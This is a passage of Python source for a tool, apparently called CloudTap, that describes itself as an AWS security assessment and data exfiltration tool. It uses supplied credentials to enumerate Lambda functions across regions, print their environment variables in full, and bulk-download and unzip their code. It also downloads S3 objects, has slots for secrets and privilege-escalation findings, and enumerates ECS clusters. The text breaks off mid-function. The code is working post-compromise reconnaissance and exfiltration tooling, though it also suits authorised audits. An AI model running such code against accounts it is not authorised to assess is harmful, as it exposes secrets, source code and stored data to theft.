import boto3
import json
import os
from datetime import datetime
from pathlib import Path
from colorama import init, Fore, Back, Style
from loguru import logger
import sys
import zipfile
import requests
from urllib.parse import urlparse
import base64
import argparse
from botocore.exceptions import ProfileNotFound,ClientError,EndpointConnectionError
from tqdm import tqdm
from botocore.config import Config
import shutil
import subprocess

permissions = []  # Permissions discovered from IAM enumeration
bruteforced_permissions = []  # Permissions discovered via bruteforce
attached_policy_details = []   # NEW
inline_policy_details   = []   # NEW
group_entries           = []   # NEW


# Structure to hold enumeration results for later consumption
output_data = {
    "metadata": {
        "timestamp": datetime.utcnow().isoformat() + "Z",
        "profile": "",
        "regions_scanned": [],
        "tool_version": "1.0.0",
    },
    "identity": {},
    "permissions": {"enumerated": [], "bruteforced": []},
    "iam": {"users": []},
    "roles": {
        "all": [],
        "matching": [],
        "attempted": [],
        "successful": [],
        "details": {}          # ← new dictionary keyed by role name
    },
    "s3": {"buckets": []},
    "secrets_manager": {"secrets": []},
    "privilege_escalation": {"paths": []},
    "ec2": {"regions": {}, "instances": []},
    "sns": {"topics": [], "subscriptions": []},
    "beanstalk": {"applications": [], "environments": []},
    "lambda": {"functions": []},
    "ecs": {"clusters": []},
}

AWS_REGIONS = [
    'us-east-1', 'us-east-2', 'us-west-1', 'us-west-2',
    'eu-west-1', 'eu-west-2', 'eu-west-3', 'eu-central-1', 'eu-north-1',
    'ap-southeast-1', 'ap-southeast-2', 'ap-northeast-1', 'ap-northeast-2', 'ap-south-1',
    'ca-central-1', 'sa-east-1', 'af-south-1', 'ap-east-1', 'me-south-1'
]

# Initialize colorama for cross-platform colored output
init(autoreset=True)

# Configure loguru logger
logger.remove()  # Remove default handler
logger.add(sys.stdout, format="<green>{time:YYYY-MM-DD HH:mm:ss}</green> | <level>{level: <8}</level> | <cyan>{name}</cyan>:<cyan>{function}</cyan>:<cyan>{line}</cyan> - <level>{message}</level>")
logger.add("aws_security_assessment.log", rotation="10 MB", retention="7 days")

def load_env_file(env_file_path=".env"):
    """Load environment variables from .env file"""
    if not os.path.exists(env_file_path):
        return False
    
    try:
        with open(env_file_path, 'r') as f:
            for line in f:
                line = line.strip()
                if line and not line.startswith('#') and '=' in line:
                    key, value = line.split('=', 1)
                    key = key.strip()
                    value = value.strip().strip('"').strip("'")
                    os.environ[key] = value
        return True
    except Exception as e:
        logger.error(f"Error loading .env file: {e}")
        return False

def get_aws_credentials_from_profile(profile_name):
    """Get AWS credentials from AWS CLI profile or environment variables"""
    credentials = {}
    
    try:
        # First try to get from AWS CLI profile
        if profile_name != "default":
            session = boto3.Session(profile_name=profile_name)
        else:
            session = boto3.Session()
            
        # Get credentials from the session
        creds = session.get_credentials()
        
        if creds:
            credentials['access_key'] = creds.access_key
            credentials['secret_key'] = creds.secret_key
            credentials['session_token'] = creds.token
            
            # Get region from session
            credentials['region'] = session.region_name or 'us-east-1'
            
            return credentials
            
    except ProfileNotFound:
        print(f"{Fore.RED}❌ AWS profile '{profile_name}' not found{Style.RESET_ALL}")
        
    except Exception as e:
        print(f"{Fore.RED}❌ Error loading profile '{profile_name}': {e}{Style.RESET_ALL}")
    
    # Fallback: try environment variables with profile-specific names
    env_vars = [
        f"AWS_ACCESS_KEY_ID_{profile_name.upper()}",
        f"AWS_SECRET_ACCESS_KEY_{profile_name.upper()}",
        f"AWS_SESSION_TOKEN_{profile_name.upper()}",
        f"AWS_REGION_{profile_name.upper()}"
    ]
    
    # Also try standard environment variables
    if profile_name == "default":
        env_vars.extend([
            "AWS_ACCESS_KEY_ID",
            "AWS_SECRET_ACCESS_KEY", 
            "AWS_SESSION_TOKEN",
            "AWS_REGION"
        ])
    
    # Check environment variables
    access_key = None
    secret_key = None
    session_token = None
    region = None
    
    for var in env_vars:
        if var.endswith('ACCESS_KEY_ID') and var in os.environ:
            access_key = os.environ[var]
        elif var.endswith('SECRET_ACCESS_KEY') and var in os.environ:
            secret_key = os.environ[var]
        elif var.endswith('SESSION_TOKEN') and var in os.environ:
            session_token = os.environ[var]
        elif var.endswith('REGION') and var in os.environ:
            region = os.environ[var]
    
    if access_key and secret_key:
        credentials['access_key'] = access_key
        credentials['secret_key'] = secret_key
        credentials['session_token'] = session_token
        credentials['region'] = region or 'us-east-1'
        return credentials
    
    return None

def list_available_profiles():
    """List available AWS profiles"""
    profiles = []
    
    # Check AWS credentials file
    aws_dir = Path.home() / '.aws'
    credentials_file = aws_dir / 'credentials'
    config_file = aws_dir / 'config'
    
    if credentials_file.exists():
        try:
            import configparser
            config = configparser.ConfigParser()
            config.read(credentials_file)
            profiles.extend(config.sections())
        except Exception as e:
            logger.debug(f"Error reading credentials file: {e}")
    
    if config_file.exists():
        try:
            import configparser
            config = configparser.ConfigParser()
            config.read(config_file)
            for section in config.sections():
                if section.startswith('profile '):
                    profile_name = section.replace('profile ', '')
                    if profile_name not in profiles:
                        profiles.append(profile_name)
        except Exception as e:
            logger.debug(f"Error reading config file: {e}")
    
    # Add default profile
    if 'default' not in profiles:
        profiles.insert(0, 'default')
    
    return profiles

def custom_serializer(obj):
    if isinstance(obj, datetime):
        return obj.isoformat()
    raise TypeError(f"Type {type(obj)} not serializable")

def print_policy_document(policy_doc, indent=""):
    """Print a policy document with proper formatting and optional indentation"""
    try:
        formatted_policy = json.dumps(policy_doc, indent=2, default=str)
        for line in formatted_policy.split('\n'):
            print(f"{indent}{Fore.WHITE}{line}{Style.RESET_ALL}")
    except Exception as e:
        print(f"{indent}{Fore.RED}Error formatting policy: {e}{Style.RESET_ALL}")

def safe_filename(filename):
    """Convert S3 key to safe local filename/path"""
    safe_chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789-_./\\"
    return ''.join(c if c in safe_chars else '_' for c in filename)

def parse_arguments():
    """Parse command line arguments"""
    parser = argparse.ArgumentParser(
        description="AWS Security Assessment & Data Exfiltration Tool",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  python3 CloudTap.py --keys default          # Use default AWS profile
  python3 CloudTap.py --keys myprofile        # Use specific AWS profile
  python3 CloudTap.py --keys init             # Use 'init' profile
  python3 CloudTap.py                         # Manual credential input
        """
    )
    
    parser.add_argument(
        '--keys', 
        type=str, 
        help='AWS profile name to load credentials from (e.g., default, init, myprofile)'
    )
    
    parser.add_argument(
        '--list-profiles',
        action='store_true',
        help='List available AWS profiles and exit'
    )
    
    parser.add_argument(
        '--env-file',
        type=str,
        default='.env',
        help='Path to .env file (default: .env)'
    )
    
    return parser.parse_args()

def download_s3_object(s3_client, bucket_name, obj_key, local_base_path, pbar=None):
    """Download S3 object and create necessary directories"""
    try:
        # Create safe local path
        safe_key = safe_filename(obj_key)
        local_path = Path(local_base_path) / safe_key
        
        # Create parent directories
        local_path.parent.mkdir(parents=True, exist_ok=True)
        
        # Download file with progress
        logger.info(f"Downloading: {obj_key} -> {local_path}")
        s3_client.download_file(bucket_name, obj_key, str(local_path))
        
        if pbar:
            pbar.update(1)
            pbar.set_postfix_str(f"Downloaded: {obj_key[:50]}...")
        
        print(f"  {Fore.GREEN}✅ Downloaded: {obj_key}{Style.RESET_ALL}")
        return True
    except Exception as e:
        error_msg = f"Error downloading {obj_key}: {e}"
        logger.error(error_msg)
        print(f"  {Fore.RED}❌ {error_msg}{Style.RESET_ALL}")
        return False

def download_lambda_code(lambda_client, function_name, local_base_path):
    """Download Lambda function code"""
    try:
        # Get function details including download URL
        function_response = lambda_client.get_function(FunctionName=function_name)
        code_location = function_response.get('Code', {}).get('Location')
        
        if not code_location:
            print(f"  {Fore.YELLOW}⚠️ No download URL available for {function_name}{Style.RESET_ALL}")
            return False
        
        # Create safe local path
        safe_name = safe_filename(function_name)
        local_path = Path(local_base_path) / f"{safe_name}.zip"
        
        # Create parent directories
        local_path.parent.mkdir(parents=True, exist_ok=True)
        
        # Download the zip file
        logger.info(f"Downloading Lambda code: {function_name} -> {local_path}")
        response = requests.get(code_location, stream=True)
        response.raise_for_status()
        
        with open(local_path, 'wb') as f:
            for chunk in response.iter_content(chunk_size=8192):
                f.write(chunk)
        
        # Also extract the zip for easy inspection
        extract_path = local_path.parent / safe_name
        extract_path.mkdir(exist_ok=True)
        
        with zipfile.ZipFile(local_path, 'r') as zip_ref:
            zip_ref.extractall(extract_path)
        
        print(f"  {Fore.GREEN}✅ Downloaded and extracted: {function_name}{Style.RESET_ALL}")
        print(f"  {Fore.CYAN}📁 ZIP: {local_path}{Style.RESET_ALL}")
        print(f"  {Fore.CYAN}📁 Extracted: {extract_path}{Style.RESET_ALL}")
        
        return True
        
    except Exception as e:
        error_msg = f"Error downloading Lambda code for {function_name}: {e}"
        logger.error(error_msg)
        print(f"  {Fore.RED}❌ {error_msg}{Style.RESET_ALL}")
        return False

def analyze_lambda_functions(session, current_region):
    """Comprehensive Lambda function analysis"""
    print(f"\n{Fore.YELLOW}=== Lambda Functions Analysis ==={Style.RESET_ALL}")
    logger.info("Starting Lambda functions analysis")
    
    # Ask user about region scanning
    search_all_regions = input(f"{Fore.GREEN}Search Lambda functions in all regions? (y/n) [default: current region only]: {Style.RESET_ALL}").strip().lower()
    
    regions_to_scan = []
    if search_all_regions in ['y', 'yes']:
        print(f"{Fore.BLUE}Getting all available regions...{Style.RESET_ALL}")
        try:
            ec2_client = session.client('ec2', region_name=current_region)
            regions_response = ec2_client.describe_regions()
            regions_to_scan = [region['RegionName'] for region in regions_response['Regions']]
            print(f"{Fore.GREEN}Will scan {len(regions_to_scan)} regions: {', '.join(regions_to_scan)}{Style.RESET_ALL}")
            logger.info(f"Scanning Lambda functions in all {len(regions_to_scan)} regions")
        except Exception as e:
            print(f"{Fore.RED}❌ Error getting regions dynamically: {e}{Style.RESET_ALL}")
            print(f"{Fore.YELLOW}Using hardcoded region list...{Style.RESET_ALL}")
            # Same hardcoded region list
            regions_to_scan = AWS_REGIONS
    else:
        regions_to_scan = [current_region]
        print(f"{Fore.CYAN}Scanning Lambda functions in current region: {current_region}{Style.RESET_ALL}")
        logger.info(f"Scanning Lambda functions in current region only: {current_region}")
    
    # Create lambda downloads directory
    lambda_dir = Path("lambda_downloads")
    lambda_dir.mkdir(exist_ok=True)
    
    total_functions_found = 0
    total_downloaded = 0
    collected_entries = []
    
    # Process each region
    for region in regions_to_scan:
        print(f"\n{Fore.MAGENTA}🌍 Scanning region: {region}{Style.RESET_ALL}")
        logger.info(f"Scanning Lambda functions in region: {region}")
        
        try:
            lambda_client = session.client("lambda", region_name=region)
            region_functions, region_downloaded, region_entries = analyze_lambda_functions_in_region(lambda_client, lambda_dir, region)
            total_functions_found += region_functions
            total_downloaded += region_downloaded
            collected_entries.extend(region_entries)
            
        except Exception as e:
            error_msg = f"Error scanning region {region}: {e}"
            logger.error(error_msg)
            print(f"{Fore.RED}❌ {error_msg}{Style.RESET_ALL}")
    
    # Final summary
    print(f"\n{Fore.GREEN}🌍 Multi-Region Lambda Summary:{Style.RESET_ALL}")
    print(f"  {Fore.CYAN}Regions scanned: {len(regions_to_scan)}{Style.RESET_ALL}")
    print(f"  {Fore.CYAN}Total functions found: {total_functions_found}{Style.RESET_ALL}")
    print(f"  {Fore.GREEN}Total functions downloaded: {total_downloaded}{Style.RESET_ALL}")
    print(f"  {Fore.MAGENTA}Downloads saved to: ./lambda_downloads/{Style.RESET_ALL}")

    logger.info(f"Lambda analysis complete across {len(regions_to_scan)} regions: {total_functions_found} functions, {total_downloaded} downloaded")

    for entry in collected_entries:
        if entry["region"] not in output_data["metadata"]["regions_scanned"]:
            output_data["metadata"]["regions_scanned"].append(entry["region"])
    output_data["lambda"]["functions"].extend(collected_entries)

def analyze_lambda_functions_in_region(lambda_client, lambda_dir, region):
    """Analyze Lambda functions in a specific region"""
    region_functions_count = 0
    region_downloaded_count = 0
    region_entries = []
    
    try:
        # List all Lambda functions in this region
        print(f"{Fore.BLUE}Discovering Lambda functions in {region}...{Style.RESET_ALL}")
        paginator = lambda_client.get_paginator('list_functions')
        functions = []
        
        for page in paginator.paginate():
            functions.extend(page.get('Functions', []))
        
        if not functions:
            print(f"{Fore.YELLOW}No Lambda functions found in {region}.{Style.RESET_ALL}")
            logger.info(f"No Lambda functions found in {region}")
            return 0, 0
        
        region_functions_count = len(functions)
        
        print(f"{Fore.GREEN}Found {len(functions)} Lambda functions in {region}:{Style.RESET_ALL}")
        logger.info(f"Found {len(functions)} Lambda functions in {region}")
        
        # Process each function
        downloaded_count = 0
        with tqdm(total=len(functions), desc=f"Analyzing Lambda functions in {region}", unit="function", colour="purple") as pbar:
            
            for func in functions:
                function_name = func['FunctionName']
                pbar.set_description(f"Analyzing {function_name[:30]}...")

                env_vars = {}
                
                print(f"\n{Fore.CYAN}{'='*60}{Style.RESET_ALL}")
                print(f"{Fore.CYAN}Function: {function_name}{Style.RESET_ALL}")
                print(f"{Fore.CYAN}{'='*60}{Style.RESET_ALL}")
                
                # Basic function info
                print(f"{Fore.MAGENTA}📋 Basic Information:{Style.RESET_ALL}")
                print(f"  {Fore.GREEN}Function Name: {func['FunctionName']}{Style.RESET_ALL}")
                print(f"  {Fore.GREEN}Runtime: {func.get('Runtime', 'N/A')}{Style.RESET_ALL}")
                print(f"  {Fore.GREEN}Handler: {func.get('Handler', 'N/A')}{Style.RESET_ALL}")
                print(f"  {Fore.GREEN}Code Size: {func.get('CodeSize', 0):,} bytes{Style.RESET_ALL}")
                print(f"  {Fore.GREEN}Timeout: {func.get('Timeout', 'N/A')} seconds{Style.RESET_ALL}")
                print(f"  {Fore.GREEN}Memory: {func.get('MemorySize', 'N/A')} MB{Style.RESET_ALL}")
                print(f"  {Fore.GREEN}Last Modified: {func.get('LastModified', 'N/A')}{Style.RESET_ALL}")
                print(f"  {Fore.GREEN}ARN: {func.get('FunctionArn', 'N/A')}{Style.RESET_ALL}")
                
                if func.get('Role'):
                    print(f"  {Fore.YELLOW}Execution Role: {func['Role']}{Style.RESET_ALL}")
                
                # Get detailed configuration (including environment variables)
                try:
                    config = lambda_client.get_function_configuration(FunctionName=function_name)
                    
                    # Environment variables
                    env_vars = config.get('Environment', {}).get('Variables', {})
                    if env_vars:
                        print(f"\n{Fore.RED}🔑 Environment Variables (SENSITIVE!):{Style.RESET_ALL}")
                        for key, value in env_vars.items():
                            print(f"  {Fore.RED}{key}: {value}{Style.RESET_ALL}")
                        logger.warning(f"Found {len(env_vars)} environment variables in {function_name}")
                    else:
                        print(f"\n{Fore.BLUE}Environment Variables: None{Style.RESET_ALL}")
                    
                    # VPC Configuration
                    vpc_config = config.get('VpcConfig', {})
                    if vpc_config and vpc_config.get('VpcId'):
                        print(f"\n{Fore.CYAN}🌐 VPC Configuration:{Style.RESET_ALL}")
                        print(f"  {Fore.GREEN}VPC ID: {vpc_config.get('VpcId')}{Style.RESET_ALL}")
                        print(f"  {Fore.GREEN}Subnets: {', '.join(vpc_config.get('SubnetIds', []))}{Style.RESET_ALL}")
                        print(f"  {Fore.GREEN}Security Groups: {', '.join(vpc_config.get('SecurityGroupIds', []))}{Style.RESET_ALL}")
                    
                except Exception as e:
                    logger.error(f"Error getting detailed config for {function_name}: {e}")
                    print(f"  {Fore.RED}❌ Error getting detailed configuration: {e}{Style.RESET_ALL}")
                
                # Check resource-based policy (who can invoke)
                try:
                    policy_response = lambda_client.get_policy(FunctionName=function_name)
                    policy_doc = json.loads(policy_response['Policy'])
                    print(f"\n{Fore.RED}🚨 Resource-Based Policy (Invocation Permissions):{Style.RESET_ALL}")
                    print_policy_document(policy_doc)
                    
                    # Check for dangerous permissions
                    policy_str = json.dumps(policy_doc)
                    if '"Principal": "*"' in policy_str:
                        print(f"  {Fore.RED}⚠️  WARNING: Function allows public invocation!{Style.RESET_ALL}")
                        logger.warning(f"Function {function_name} allows public invocation")
                    
                except lambda_client.exceptions.ResourceNotFoundException:
                    print(f"\n{Fore.BLUE}Resource-Based Policy: None (function not publicly accessible){Style.RESET_ALL}")
                except Exception as e:
                    logger.error(f"Error getting policy for {function_name}: {e}")
                    print(f"  {Fore.RED}❌ Error getting resource policy: {e}{Style.RESET_ALL}")
                
                # Check for function URLs (direct HTTP endpoints)
                try:
                    url_config = lambda_client.get_function_url_config(FunctionName=function_name)
                    print(f"\n{Fore.RED}🌐 Function URL Configuration:{Style.RESET_ALL}")
                    print(f"  {Fore.GREEN}URL: {url_config.get('FunctionUrl')}{Style.RESET_ALL}")
                    print(f"  {Fore.GREEN}Auth Type: {url_config.get('AuthType')}{Style.RESET_ALL}")
                    print(f"  {Fore.GREEN}CORS: {url_config.get('Cors', 'Not configured')}{Style.RESET_ALL}")
                    
                    if url_config.get('AuthType') == 'NONE':
                        print(f"  {Fore.RED}⚠️  WARNING: Function URL is publicly accessible!{Style.RESET_ALL}")
                        logger.warning(f"Function {function_name} has public URL: {url_config.get('FunctionUrl')}")
                    
                except lambda_client.exceptions.ResourceNotFoundException:
                    print(f"\n{Fore.BLUE}Function URL: Not configured{Style.RESET_ALL}")
                except Exception as e:
                    logger.debug(f"Error getting function URL for {function_name}: {e}")
                
                # Check event source mappings
                try:
                    mappings = lambda_client.list_event_source_mappings(FunctionName=function_name)
                    event_sources = mappings.get('EventSourceMappings', [])
                    
                    if event_sources:
                        print(f"\n{Fore.CYAN}⚡ Event Source Mappings:{Style.RESET_ALL}")
                        for mapping in event_sources:
                            print(f"  {Fore.GREEN}Source ARN: {mapping.get('EventSourceArn')}{Style.RESET_ALL}")
                            print(f"  {Fore.GREEN}State: {mapping.get('State')}{Style.RESET_ALL}")
                            print(f"  {Fore.GREEN}Batch Size: {mapping.get('BatchSize')}{Style.RESET_ALL}")
                            if mapping.get('LastModified'):
                                print(f"  {Fore.GREEN}Last Modified: {mapping['LastModified']}{Style.RESET_ALL}")
                            print()
                    else:
                        print(f"\n{Fore.BLUE}Event Source Mappings: None{Style.RESET_ALL}")
                        
                except Exception as e:
                    logger.error(f"Error getting event sources for {function_name}: {e}")
                    print(f"  {Fore.RED}❌ Error getting event sources: {e}{Style.RESET_ALL}")
                
                # Download function code
                print(f"\n{Fore.YELLOW}📥 Attempting to download function code...{Style.RESET_ALL}")
                if download_lambda_code(lambda_client, function_name, lambda_dir / region):
                    downloaded_count += 1

                entry = {
                    "region": region,
                    "name": func["FunctionName"],
                    "runtime": func.get("Runtime"),
                    "handler": func.get("Handler"),
                    "arn": func.get("FunctionArn"),
                    "role": func.get("Role"),
                }
                if env_vars:
                    entry["env_var_keys"] = list(env_vars.keys())
                region_entries.append(entry)
                
                pbar.update(1)
        
        region_downloaded_count = downloaded_count
        
        # Region summary
        print(f"\n{Fore.GREEN}📊 {region} Lambda Summary:{Style.RESET_ALL}")
        print(f"  {Fore.CYAN}Functions analyzed: {len(functions)}{Style.RESET_ALL}")
        print(f"  {Fore.GREEN}Function code downloaded: {downloaded_count}{Style.RESET_ALL}")
        
        logger.info(f"Region {region} analysis complete: {len(functions)} functions, {downloaded_count} downloaded")
        
        return region_functions_count, region_downloaded_count, region_entries
        
    except Exception as e:
        error_msg = f"Error during Lambda analysis in {region}: {e}"
        logger.error(error_msg)
        print(f"{Fore.RED}❌ {error_msg}{Style.RESET_ALL}")
        return 0, 0, []


def analyze_ecs_cluster(ecs_client, cluster_name, region):
    """Analyze a specific ECS cluster and its resources"""
    try:
        print(f"\n{Fore.CYAN}{'='*80}{Style.RESET_ALL}")
        print(f"{Fore.CYAN}🚢 ECS Cluster: {cluster_name}{Style.RESET_ALL}")
        print(f"{Fore.CYAN}{'='*80}{Style.RESET_ALL}")
        
        # Get cluster details
        cluster_response = ecs_client.describe_clusters(clusters=[cluster_name])
        clusters = cluster_response.get('clusters', [])
        
        if not clusters:
            print(f"{Fore.RED}❌ Cluster {cluster_name} not found{Style.RESET_ALL}")
            return
        
        cluster = clusters[0]
        
        # Display cluster information
        print(f"{Fore.MAGENTA}📋 Cluster Information:{Style.RESET_ALL}")
        print(f"  {Fore.GREEN}Cluster Name: {cluster.get('clusterName')}{Style.RESET_ALL}")
        print(f"  {Fore.GREEN}Status: {cluster.get('status')}{Style.RESET_ALL}")
        print(f"  {Fore.GREEN}Running Tasks: {cluster.get('runningTasksCount', 0)}{Style.RESET_ALL}")
        print(f"  {Fore.GREEN}Pending Tasks: {cluster.get('pendingTasksCount', 0)}{Style.RESET_ALL}")
        print(f"  {Fore.GREEN}Services: {cluster.get('servicesCount', 0)}{Style.RESET_ALL}")
        print(f"  {Fore.GREEN}Registered Container Instances: {cluster.get('registeredContainerInstancesCount', 0)}{Style.RESET_ALL}")
        print(f"  {Fore.GREEN}ARN: {cluster.get('clusterArn')}{Style.RESET_ALL}")
        
        # Display cluster settings
        settings = cluster.get('settings', [])
        if settings:
            print(f"\n{Fore.CYAN}⚙️ Cluster Settings:{Style.RESET_ALL}")
            for setting in settings:
                print(f"  {Fore.GREEN}{setting.get('name')}: {setting.get('value')}{Style.RESET_ALL}")
        
        # Display cluster configuration
        config = cluster.get('configuration', {})
        if config:
            print(f"\n{Fore.CYAN}🔧 Cluster Configuration:{Style.RESET_ALL}")
            
            # Execute command configuration
            execute_command_config = config.get('executeCommandConfiguration', {})
            if execute_command_config:
                print(f"  {Fore.YELLOW}Execute Command Configuration:{Style.RESET_ALL}")
                print(f"    {Fore.GREEN}KMS Key ID: {execute_command_config.get('kmsKeyId', 'N/A')}{Style.RESET_ALL}")
                print(f"    {Fore.GREEN}Logging: {execute_command_config.get('logging', 'N/A')}{Style.RESET_ALL}")
                
                # Check for potentially risky execute command settings
                if execute_command_config.get('logging') == 'NONE':
                    print(f"    {Fore.RED}⚠️  WARNING: Execute command logging is disabled!{Style.RESET_ALL}")
                    logger.warning(f"ECS cluster {cluster_name} has execute command logging disabled")
        
        # Display tags
        tags = cluster.get('tags', [])
        if tags:
            print(f"\n{Fore.CYAN}🏷️ Cluster Tags:{Style.RESET_ALL}")
            for tag in tags:
                print(f"  {Fore.GREEN}{tag.get('key')}: {tag.get('value')}{Style.RESET_ALL}")
        
        # Analyze services in the cluster
        analyze_ecs_services(ecs_client, cluster_name, region)
        
        # Analyze tasks in the cluster
        analyze_ecs_tasks(ecs_client, cluster_name, region)
        
        # Analyze container instances
        analyze_container_instances(ecs_client, cluster_name, region)
        
    except Exception as e:
        error_msg = f"Error analyzing ECS cluster {cluster_name}: {e}"
        logger.error(error_msg)
        print(f"{Fore.RED}❌ {error_msg}{Style.RESET_ALL}")

def analyze_ecs_services(ecs_client, cluster_name, region):
    """Analyze ECS services in a cluster"""
    try:
        print(f"\n{Fore.BLUE}🔧 Analyzing ECS Services in cluster {cluster_name}...{Style.RESET_ALL}")
        
        # List services
        services_response = ecs_client.list_services(cluster=cluster_name)
        service_arns = services_response.get('serviceArns', [])
        
        if not service_arns:
            print(f"{Fore.YELLOW}No services found in cluster {cluster_name}{Style.RESET_ALL}")
            return
        
        # Describe services
        services_detail = ecs_client.describe_services(cluster=cluster_name, services=service_arns)
        services = services_detail.get('services', [])
        
        print(f"{Fore.GREEN}Found {len(services)} services:{Style.RESET_ALL}")
        
        for service in services:
            print(f"\n{Fore.CYAN}  🔧 Service: {service.get('serviceName')}{Style.RESET_ALL}")
            print(f"    {Fore.GREEN}Status: {service.get('status')}{Style.RESET_ALL}")
            print(f"    {Fore.GREEN}Task Definition: {service.get('taskDefinition')}{Style.RESET_ALL}")
            print(f"    {Fore.GREEN}Desired Count: {service.get('desiredCount', 0)}{Style.RESET_ALL}")
            print(f"    {Fore.GREEN}Running Count: {service.get('runningCount', 0)}{Style.RESET_ALL}")
            print(f"    {Fore.GREEN}Pending Count: {service.get('pendingCount', 0)}{Style.RESET_ALL}")
            print(f"    {Fore.GREEN}Launch Type: {service.get('launchType', 'N/A')}{Style.RESET_ALL}")
            print(f"    {Fore.GREEN}Platform Version: {service.get('platformVersion', 'N/A')}{Style.RESET_ALL}")
            print(f"    {Fore.GREEN}Created At: {service.get('createdAt', 'N/A')}{Style.RESET_ALL}")
            print(f"    {Fore.GREEN}ARN: {service.get('serviceArn')}{Style.RESET_ALL}")
            
            # Network configuration
            network_config = service.get('networkConfiguration', {})
            if network_config:
                awsvpc_config = network_config.get('awsvpcConfiguration', {})
                if awsvpc_config:
                    print(f"    {Fore.YELLOW}Network Configuration:{Style.RESET_ALL}")
                    print(f"      {Fore.GREEN}Subnets: {', '.join(awsvpc_config.get('subnets', []))}{Style.RESET_ALL}")
                    print(f"      {Fore.GREEN}Security Groups: {', '.join(awsvpc_config.get('securityGroups', []))}{Style.RESET_ALL}")
                    print(f"      {Fore.GREEN}Public IP: {awsvpc_config.get('assignPublicIp', 'N/A')}{Style.RESET_ALL}")
                    
                    # Check for public IP assignment
                    if awsvpc_config.get('assignPublicIp') == 'ENABLED':
                        print(f"      {Fore.YELLOW}⚠️  Service assigns public IPs to tasks{Style.RESET_ALL}")
            
            # Load balancers
            load_balancers = service.get('loadBalancers', [])
            if load_balancers:
                print(f"    {Fore.CYAN}Load Balancers:{Style.RESET_ALL}")
                for lb in load_balancers:
                    print(f"      {Fore.GREEN}Target Group ARN: {lb.get('targetGroupArn', 'N/A')}{Style.RESET_ALL}")
                    print(f"      {Fore.GREEN}Load Balancer Name: {lb.get('loadBalancerName', 'N/A')}{Style.RESET_ALL}")
                    print(f"      {Fore.GREEN}Container Name: {lb.get('containerName', 'N/A')}{Style.RESET_ALL}")
                    print(f"      {Fore.GREEN}Container Port: {lb.get('containerPort', 'N/A')}{Style.RESET_ALL}")
            
            # Service registries
            service_registries = service.get('serviceRegistries', [])
            if service_registries:
                print(f"    {Fore.CYAN}Service Discovery:{Style.RESET_ALL}")
                for registry in service_registries:
                    print(f"      {Fore.GREEN}Registry ARN: {registry.get('registryArn')}{Style.RESET_ALL}")
                    print(f"      {Fore.GREEN}Container Name: {registry.get('containerName', 'N/A')}{Style.RESET_ALL}")
            
            # Deployment configuration
            deployment_config = service.get('deploymentConfiguration', {})
            if deployment_config:
                print(f"    {Fore.CYAN}Deployment Configuration:{Style.RESET_ALL}")
                print(f"      {Fore.GREEN}Maximum Percent: {deployment_config.get('maximumPercent', 'N/A')}%{Style.RESET_ALL}")
                print(f"      {Fore.GREEN}Minimum Healthy Percent: {deployment_config.get('minimumHealthyPercent', 'N/A')}%{Style.RESET_ALL}")
            
            # Tags
            try:
                tags_response = ecs_client.list_tags_for_resource(resourceArn=service.get('serviceArn'))
                tags = tags_response.get('tags', [])
                if tags:
                    print(f"    {Fore.CYAN}Tags:{Style.RESET_ALL}")
                    for tag in tags:
                        print(f"      {Fore.GREEN}{tag.get('key')}: {tag.get('value')}{Style.RESET_ALL}")
            except Exception as e:
                logger.debug(f"Error getting tags for service {service.get('serviceName')}: {e}")
        
    except Exception as e:
        error_msg = f"Error analyzing ECS services in cluster {cluster_name}: {e}"
        logger.error(error_msg)
        print(f"{Fore.RED}❌ {error_msg}{Style.RESET_ALL}")

def analyze_ecs_tasks(ecs_client, cluster_name, region):
    """Analyze ECS tasks in a cluster"""
    try:
        print(f"\n{Fore.BLUE}📋 Analyzing ECS Tasks in cluster {cluster_name}...{Style.RESET_ALL}")
        
        # List running tasks
        running_tasks_response = ecs_client.list_tasks(cluster=cluster_name, desiredStatus='RUNNING')
        running_task_arns = running_tasks_response.get('taskArns', [])
        
        # List stopped tasks (recent ones)
        stopped_tasks_response = ecs_client.list_tasks(cluster=cluster_name, desiredStatus='STOPPED')
        stopped_task_arns = stopped_tasks_response.get('taskArns', [])
        
        all_task_arns = running_task_arns + stopped_task_arns
        
        if not all_task_arns:
            print(f"{Fore.YELLOW}No tasks found in cluster {cluster_name}{Style.RESET_ALL}")
            return
        
        print(f"{Fore.GREEN}Found {len(running_task_arns)} running tasks and {len(stopped_task_arns)} stopped tasks{Style.RESET_ALL}")
        
        # Describe tasks (limit to avoid overwhelming output)
        tasks_to_describe = all_task_arns[:20]  # Limit to first 20 tasks
        if len(all_task_arns) > 20:
            print(f"{Fore.YELLOW}Showing details for first 20 tasks (total: {len(all_task_arns)}){Style.RESET_ALL}")
        
        if tasks_to_describe:
            tasks_detail = ecs_client.describe_tasks(cluster=cluster_name, tasks=tasks_to_describe)
            tasks = tasks_detail.get('tasks', [])
            
            for task in tasks:
                print(f"\n{Fore.CYAN}  📋 Task: {task.get('taskArn', '').split('/')[-1]}{Style.RESET_ALL}")
                print(f"    {Fore.GREEN}Task Definition: {task.get('taskDefinitionArn', '').split('/')[-1]}{Style.RESET_ALL}")
                print(f"    {Fore.GREEN}Last Status: {task.get('lastStatus')}{Style.RESET_ALL}")
                print(f"    {Fore.GREEN}Desired Status: {task.get('desiredStatus')}{Style.RESET_ALL}")
                print(f"    {Fore.GREEN}Health Status: {task.get('healthStatus', 'N/A')}{Style.RESET_ALL}")
                print(f"    {Fore.GREEN}Launch Type: {task.get('launchType', 'N/A')}{Style.RESET_ALL}")
                print(f"    {Fore.GREEN}Platform Version: {task.get('platformVersion', 'N/A')}{Style.RESET_ALL}")
                print(f"    {Fore.GREEN}CPU/Memory: {task.get('cpu', 'N/A')}/{task.get('memory', 'N/A')}{Style.RESET_ALL}")
                print(f"    {Fore.GREEN}Created At: {task.get('createdAt', 'N/A')}{Style.RESET_ALL}")
                print(f"    {Fore.GREEN}Started At: {task.get('startedAt', 'N/A')}{Style.RESET_ALL}")
                
                if task.get('stoppedAt'):
                    print(f"    {Fore.YELLOW}Stopped At: {task.get('stoppedAt')}{Style.RESET_ALL}")
                    print(f"    {Fore.YELLOW}Stop Code: {task.get('stopCode', 'N/A')}{Style.RESET_ALL}")
                    if task.get('stoppedReason'):
                        print(f"    {Fore.YELLOW}Stop Reason: {task.get('stoppedReason')}{Style.RESET_ALL}")
                
                # Container information
                containers = task.get('containers', [])
                if containers:
                    print(f"    {Fore.CYAN}Containers ({len(containers)}):{Style.RESET_ALL}")
                    for container in containers:
